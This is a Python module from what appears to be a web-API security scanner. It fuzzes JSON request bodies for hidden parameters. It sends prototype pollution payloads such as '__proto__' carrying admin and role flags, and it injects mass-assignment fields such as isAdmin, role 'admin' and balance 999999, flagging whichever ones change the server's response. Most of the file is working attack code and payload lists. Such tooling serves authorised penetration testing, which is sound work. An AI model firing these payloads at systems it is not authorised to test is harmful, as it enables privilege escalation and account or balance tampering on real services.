"""
Technique: JSON Body Parameter Mining + Prototype Pollution
-------------------------------------------------------------
Mines hidden JSON body keys that alter API behavior.
Also tests for prototype pollution (__proto__, constructor, etc.)

Unique features:
  - Nested JSON key discovery (obj.subkey)
  - Array index injection ([0], [1])
  - Prototype pollution detection
  - Type confusion testing (string vs int vs bool vs null)
  - Hidden boolean flags (isAdmin, debugMode, etc.)
  - Mass assignment vectors
"""

import json
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from ..core import (request, ResponseDiff, CANARY_VALUE,
                    R, G, Y, C, DIM, BOLD, RST)
from ..wordlists.params import JSON_PARAMS, DEBUG_PARAMS, AUTH_PARAMS

# Prototype pollution payloads
PROTOTYPE_KEYS = [
    "__proto__",
    "constructor",
    "prototype",
    "__proto__[admin]",
    "__proto__[isAdmin]",
    "__proto__[role]",
    "__proto__[debug]",
    "constructor.prototype",
    "constructor[prototype]",
    "__defineGetter__",
    "__defineSetter__",
    "__lookupGetter__",
    "__lookupSetter__",
]

# Type variation values for confirmed params
TYPE_VARIATIONS = {
    "true_bool":   True,
    "false_bool":  False,
    "null":        None,
    "zero":        0,
    "one":         1,
    "neg_one":     -1,
    "empty_str":   "",
    "admin_str":   "admin",
    "array":       [],
    "object":      {},
}


def _build_nested_payload(keys: list, value, existing_body: dict = None) -> dict:
    """Build a JSON body with nested key injection."""
    body = dict(existing_body or {})

    for key in keys:
        if "." in key:
            # Nested: "user.role" → {"user": {"role": value}}
            parts = key.split(".", 1)
            if parts[0] not in body or not isinstance(body[parts[0]], dict):
                body[parts[0]] = {}
            body[parts[0]][parts[1]] = value
        elif "[" in key and "]" in key:
            # Array: "items[0]" → skip for now
            body[key] = value
        else:
            body[key] = value

    return body


def _test_json_param(url: str, param: str, value,
                      baseline: dict, cookies: str,
                      base_body: dict = None) -> dict:
    """Test a single JSON key with a given value."""
    test_body = _build_nested_payload([param], value, base_body)
    resp = request(url, method="POST", json_body=test_body, cookies=cookies)
    diff = ResponseDiff(baseline, resp, str(value) if isinstance(value, str) else CANARY_VALUE)

    if not diff.is_significant(threshold=20):
        return {}

    return {
        "param":      param,
        "value_used": value,
        "score":      diff.score(),
        "diff":       diff.summary(),
        "status":     resp["status"],
        "reflected":  diff.canary_reflected,
        "body_snippet": resp["body"][:200],
    }


def mine_json_params(url: str, baseline: dict, base_body: dict = None,
                      wordlist: list = None, cookies: str = None,
                      threads: int = 10, verbose: bool = True) -> list:
    """Mine hidden JSON body keys."""
    params_to_test = wordlist or (JSON_PARAMS + DEBUG_PARAMS[:30] + AUTH_PARAMS[:20])

    if verbose:
        print(f"\n  {C}[JSON PARAMS]{RST} Testing {len(params_to_test)} "
              f"JSON keys | {threads} threads")

    confirmed = []

    def test(param):
        # Test with canary string
        result = _test_json_param(url, param, CANARY_VALUE,
                                   baseline, cookies, base_body)
        if result:
            result["location"] = "json_body"
            result["method"]   = "POST"
            return result

        # Test with boolean true (for flag-style params)
        result2 = _test_json_param(url, param, True,
                                    baseline, cookies, base_body)
        if result2:
            result2["location"] = "json_body"
            result2["method"]   = "POST"
            return result2

        return {}

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(test, p): p for p in params_to_test}
        done = 0
        for future in as_completed(futures):
            result = future.result()
            done += 1
            if result:
                confirmed.append(result)
                if verbose:
                    print(f"  {G}[+]{RST} {R}{result['param']}{RST} = "
                          f"{repr(result['value_used'])} "
                          f"(score:{result['score']})")
            elif verbose and done % 25 == 0:
                print(f"  {DIM}[{done}/{len(params_to_test)}]{RST}", end="\r")

    if verbose:
        print(f"\r{' '*50}\r", end="")

    return confirmed


def test_prototype_pollution(url: str, baseline: dict,
                               base_body: dict = None,
                               cookies: str = None,
                               verbose: bool = True) -> list:
    """
    Test for prototype pollution via JSON body.
    Sends __proto__, constructor, and other pollution vectors.
    """
    if verbose:
        print(f"\n  {C}[PROTOTYPE POLLUTION]{RST} "
              f"Testing {len(PROTOTYPE_KEYS)} vectors")

    findings = []

    for key in PROTOTYPE_KEYS:
        test_body = dict(base_body or {})

        # Nested pollution via JSON
        if "." in key or "[" in key:
            # Use string representation
            test_body[key] = {"admin": True, "isAdmin": True}
        elif key == "__proto__":
            test_body["__proto__"] = {"admin": True, "isAdmin": True, "role": "admin"}
        elif key == "constructor":
            test_body["constructor"] = {"prototype": {"admin": True}}
        else:
            test_body[key] = True

        resp = request(url, method="POST", json_body=test_body, cookies=cookies)
        diff = ResponseDiff(baseline, resp)

        if diff.is_significant(threshold=15):
            findings.append({
                "param":    key,
                "location": "prototype_pollution",
                "method":   "POST",
                "score":    diff.score(),
                "severity": "Critical",
                "detail":   f"Prototype pollution vector '{key}' caused response change",
                "diff":     diff.summary(),
            })
            if verbose:
                print(f"  {R}{BOLD}[!!!] PROTOTYPE POLLUTION: {key}{RST}")

    if verbose and not findings:
        print(f"  {DIM}[-] No prototype pollution detected{RST}")

    return findings


def test_mass_assignment(url: str, baseline: dict,
                          base_body: dict = None,
                          cookies: str = None,
                          verbose: bool = True) -> list:
    """
    Test mass assignment vulnerability — inject privileged fields
    into existing POST bodies.
    """
    if verbose:
        print(f"\n  {C}[MASS ASSIGNMENT]{RST} Testing privilege escalation via body")

    mass_assign_payloads = [
        {"admin": True},
        {"isAdmin": True},
        {"role": "admin"},
        {"role": "administrator"},
        {"is_admin": True},
        {"is_superuser": True},
        {"privilege": "admin"},
        {"user_type": "admin"},
        {"verified": True},
        {"email_verified": True},
        {"active": True},
        {"enabled": True},
        {"balance": 999999},
        {"credits": 999999},
        {"premium": True},
        {"subscription": "enterprise"},
    ]

    findings = []

    for payload in mass_assign_payloads:
        test_body = dict(base_body or {})
        test_body.update(payload)

        resp = request(url, method="POST", json_body=test_body, cookies=cookies)
        diff = ResponseDiff(baseline, resp)

        if diff.is_significant(threshold=20):
            key = list(payload.keys())[0]
            val = list(payload.values())[0]
            findings.append({
                "param":    key,
                "value":    val,
                "location": "mass_assignment",
                "method":   "POST",
                "score":    diff.score(),
                "severity": "High",
                "detail":   f"Mass assignment: {key}={val} changed response",
                "diff":     diff.summary(),
            })
            if verbose:
                print(f"  {R}[!!!]{RST} Mass assignment: {key}={val}")

    if verbose and not findings:
        print(f"  {DIM}[-] No mass assignment vectors confirmed{RST}")

    return findings


def run_all(url: str, baseline: dict, base_body: dict = None,
             cookies: str = None, wordlist: list = None,
             threads: int = 10, verbose: bool = True) -> list:
    """Run all JSON mining techniques."""
    all_findings = []
    all_findings.extend(mine_json_params(url, baseline, base_body,
                                          wordlist, cookies, threads, verbose))
    all_findings.extend(test_prototype_pollution(url, baseline, base_body,
                                                   cookies, verbose))
    all_findings.extend(test_mass_assignment(url, baseline, base_body,
                                              cookies, verbose))
    return all_findings
